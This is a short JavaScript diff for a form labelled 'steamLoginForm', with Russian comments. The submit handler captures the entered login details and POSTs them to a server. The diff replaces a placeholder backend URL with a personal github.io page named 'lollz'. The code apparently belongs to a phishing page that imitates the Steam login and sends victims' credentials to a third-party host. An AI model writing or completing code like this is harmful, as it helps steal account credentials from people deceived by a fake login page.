@@ -1,4 +1,4 @@
-        document.getElementById('steamLoginForm').addEventListener('submit', async (event) => {
+     document.getElementById('steamLoginForm').addEventListener('submit', async (event) => {
             event.preventDefault(); // Предотвращаем стандартную отправку формы
 
             const username = document.getElementById('username').value;
@@ -6,7 +6,7 @@
 
             // Отправка данных на ваш бэкэнд
             try {
-                const response = await fetch('https://your-backend-domain.com/api/login', { // Замените на ваш домен
+                const response = await fetch('https://r99373215-design.github.io/lollz/', { // Замените на ваш домен
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
